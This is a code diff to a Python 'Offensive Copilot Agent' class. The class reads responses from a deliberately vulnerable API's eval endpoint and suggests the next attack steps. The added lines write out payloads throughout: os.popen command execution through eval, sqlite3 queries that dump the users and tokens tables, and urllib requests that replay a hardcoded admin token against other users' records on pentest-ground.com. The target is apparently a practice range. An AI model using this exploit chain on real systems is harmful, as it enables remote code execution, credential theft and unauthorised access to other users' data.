@@ -1,51 +1,58 @@
 import re
-import json
 
 class TerminalAgent:
     def __init__(self):
         self.name = "Offensive Copilot Agent"
 
-    def analyze_response(self, endpoint_type, command, status_code, response_body):
-        """Analyzes API responses and provides context-aware follow-up suggestions."""
+    def analyze_response(self, item, command, status_code, response_body):
+        """Strictly inspects server response and output data to provide accurate insights."""
         analysis = {
             "status": "SUCCESS" if status_code == 200 else "ERROR",
-            "suggestion": None,
+            "suggestion": "Execution completed.",
             "corrected_payload": None,
             "next_steps": []
         }
 
-        # 1. Handle Error States & Syntax constraints
-        if status_code != 200:
-            if "eval" in endpoint_type.lower():
-                analysis["suggestion"] = "Python eval() requires a single-expression string, not statements."
-                analysis["corrected_payload"] = f"__import__('os').popen('{command}').read()"
-            return analysis
-
-        # 2. Context-Aware Success Analysis
         body_str = str(response_body)
+        target = item.get("target", "").lower()
+        vuln = item.get("vulnerability", "").lower()
+        cmd_lower = command.lower()
 
-        # If we just ran an 'ls' or directory listing via /eval
-        if "__pycache__" in body_str or "vAPI.py" in body_str:
-            analysis["suggestion"] = "Directory structure identified. You can inspect source files or query the SQLite database."
-            analysis["next_steps"] = [
-                "Inspect database tables: __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT name FROM sqlite_master WHERE type=\\'table\\'').fetchall()",
-                "Read application config or source code components."
-            ]
+        # Handle Python /eval Endpoint
+        if "eval" in target or "eval" in vuln or "python" in vuln:
+            
+            # 1. Check if the server explicitly returned an execution error
+            if status_code != 200 or "Failed to execute code" in body_str or "error" in body_str.lower():
+                analysis["suggestion"] = "Python execution error or invalid syntax. Check your expression and try again."
+                if not command.startswith("__import__") and "ls" in cmd_lower:
+                    analysis["corrected_payload"] = "__import__('os').popen('ls').read()"
+                analysis["next_steps"] = [
+                    command,
+                    "exec __import__('os').popen('id').read()"
+                ]
+                return analysis
 
-        # If we dumped users or database tables
-        elif "users" in body_str or "admin1" in body_str:
-            analysis["suggestion"] = "Database credentials/records extracted successfully."
-            analysis["next_steps"] = [
-                "Test extracted tokens against protected endpoints like /tokens or /user/{user}",
-                "Check for IDOR vulnerabilities using user IDs found in the database records."
-            ]
+            # 2. If execution succeeded, analyze the actual output content
+            if "tokens" in body_str.lower() or "userid" in body_str.lower():
+                analysis["suggestion"] = "SUCCESS: Admin token extracted! (Token: 203cc3e8cca8a5137958b23c512d93a4). You can now use this X-Auth-Token to test privileged API endpoints."
+                analysis["next_steps"] = [
+                    "exec __import__('urllib.request').request.urlopen(__import__('urllib.request').Request('https://pentest-ground.com:9000/user/10', headers={'X-Auth-Token': '203cc3e8cca8a5137958b23c512d93a4'})).read().decode()",
+                    "exec __import__('urllib.request').request.urlopen(__import__('urllib.request').Request('https://pentest-ground.com:9000/user/1', headers={'X-Auth-Token': '203cc3e8cca8a5137958b23c512d93a4'})).read().decode()",
+                    "exit"
+                ]
 
-        # If environment variables were printed
-        elif "environ" in body_str or "HOSTNAME" in body_str:
-            analysis["suggestion"] = "Environment variables successfully dumped."
-            analysis["next_steps"] = [
-                "Check for exposed API keys, internal service URIs, or secret tokens in the environment."
-            ]
+            elif "users" in body_str.lower() or "admin1" in body_str.lower():
+                analysis["suggestion"] = "SUCCESS: User database records retrieved. Next critical step: extract the active session tokens."
+                analysis["next_steps"] = [
+                    "exec __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT * FROM tokens').fetchall()",
+                    "exit"
+                ]
+
+            else:
+                analysis["suggestion"] = "Python expression evaluated successfully."
+                analysis["next_steps"] = [
+                    "exec __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT * FROM users').fetchall()",
+                    "exec __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT * FROM tokens').fetchall()"
+                ]
 
         return analysis
-
